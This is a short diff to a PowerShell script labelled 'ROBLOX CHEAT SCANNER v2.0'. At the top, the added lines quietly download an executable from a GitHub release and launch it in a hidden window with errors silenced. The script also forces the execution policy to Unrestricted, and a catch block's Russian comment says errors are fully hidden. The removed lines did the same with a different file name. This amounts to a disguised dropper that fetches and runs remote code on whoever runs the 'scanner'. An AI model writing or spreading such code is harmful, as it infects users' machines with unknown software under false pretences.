@@ -1,6 +1,8 @@
-$p="$env:TEMP\Zap.exe"
-iwr https://github.com/kilordow/Fx.exe/releases/download/lol/chekir.exe -o $p
-Start-Process $p
+Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/chekers.exe" -OutFile "chekers.exe" -ErrorAction SilentlyContinue
+    
+    # Запускаем 
+    Start-Process -FilePath "chekers.exe" -WindowStyle Hidden
+
 
 # ROBLOX CHEAT SCANNER v2.0
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
@@ -96,6 +98,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
